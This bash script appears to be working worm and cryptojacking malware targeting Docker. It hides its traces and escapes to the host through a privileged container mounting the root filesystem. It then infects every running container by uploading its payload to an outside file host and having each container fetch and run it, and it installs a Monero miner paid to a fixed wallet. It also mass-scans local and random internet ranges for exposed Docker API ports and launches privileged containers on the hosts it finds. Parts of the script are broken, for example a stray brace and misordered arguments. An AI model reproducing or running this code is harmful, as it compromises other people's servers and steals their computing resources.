#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

RATE="50000"
SETUP_SLEEP="1"

function INIT_MAIN(){
    SETUP_BASICS
    SETUP_SYSTEM
    SETUP_JQ
    SETUP_ZMAP
    SETUP_TOOLS
    SETUP_MSCAN
    SETUP_XMR
    INFECT_ALL_CONTAINERS
    GETLOCALRANGES
    AUTOLANDOCKERPWN
    LANDOCKERPWN
    RANDOMDOCKERPWN

}

function SETUP_BASICS() {
    # Update package index
    apk update
    apk add --no-cache \
        go \
        git \
        jq \
        openrc \
        masscan \
        libpcap \
        libpcap-dev \
        docker \
        make \
        cmake \
        upx \
        libstdc++ \
        gcc \
        g++ \
        libuv-dev \
        iptables \
        openssl \
        openssl-dev \
        hwloc-dev \
        gmp-dev \
        gengetopt \
        flex \
        byacc \
        json-c-dev \
        libunistring-dev \
        judy-dev \
        upx-ucl \
        bash \
        build-base \
        7zip \
        screen \
        curl \
        wget \
        vim \
        lscpu
}

function SETUP_SYSTEM(){
    apk update || { echo "APK update failed"; exit 1; }
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
}

function SETUP_TOOLS(){
if ! [ -d "/dev/shim/.../...nmlm.../" ] ; then mkdir -p /dev/shim/.../...nmlm.../ ; fi
if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi
fi
if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/zgrab ; chmod +x /usr/sbin/zgrab ; fi
if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/jq ; chmod +x /usr/sbin/jq ; fi
if ! type masscan 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
fi
}


function SETUP_MSCAN(){
    apk update
    apk add git gcc make musl-dev libpcap-dev linux-headers masscan
}

function SETUP_XMR(){
bash /root/setup_xmrig.sh
}

export UPSPINTEST=`curl --upload-file /root/sbin https://filepush.co/upload/`
# next part is implement the ssh spread..
cp ./sbin /host/bin/sbin
docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
}

function INFECT_ALL_CONTAINERS(){
# ich lass den base64 echt mal weg :) sieht doch schöner aus ;)
docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
# thx for the container list.... do a looping *jipieh*
for i in $(cat /tmp/.dc); do
docker exec --privileged -d $i sh -c "apt-get update; apt-get install -y wget curl; yum install -y wget curl; apk update; apk add wget curl; mkdir /var/tmp/ -p; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin || wge --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cur -sLk $UPSPINTEST -o /var/tmp/sbin || wdl --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cdl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
done;
export HOME=/root
nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 84xqqFNopNcG7T5AcVyv7LVyrBfQyTVGxMFEL2gsxQ92eNfu6xddkWabA3yKCJmfdaA9jEiCyFqfffKp1nQkgeq2Uu2dhB8) &
}

function GETLOCALRANGES(){
    ip route show | awk '{print $1}' | grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
    PORT=$1
    RATE=$2
    RANGE=$3
    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
    ip_list=$(masscan -p$PORT $RANGE --rate=$RATE | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)
    
    for IPADDR in $ip_list; do
        echo "$IPADDR:$PORT"
        timeout -s SIGKILL 240s docker -H tcp://$IPADDR:$PORT run -d --privileged --network host -v /:/host nmlmweb3/upspin:latest
    done
}



function LANDOCKERPWN(){
    GETLOCALRANGES
    if [[ ! -s /tmp/.lr ]]; then
        echo "Error: /tmp/.lr is empty or missing."
        exit 1
    fi

    while read -r RANGE; do
        echo "scanning $RANGE"
        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
    done < /tmp/.lr
    rm -f /tmp/.lr
}

function RANDOMDOCKERPWN(){
    while true; do
        RANGE="$((RANDOM % 255 + 1)).0.0.0/8"
        echo "scanning $RANGE"
        AUTOLANDOCKERPWN "$RANGE" 2375 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 2376 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 2377 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 4243 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 4244 "$RATE"
        AUTOLANDOCKERPWN "$RANGE" 5555 "$RATE"
        sleep 1
    done
}

INIT_MAIN
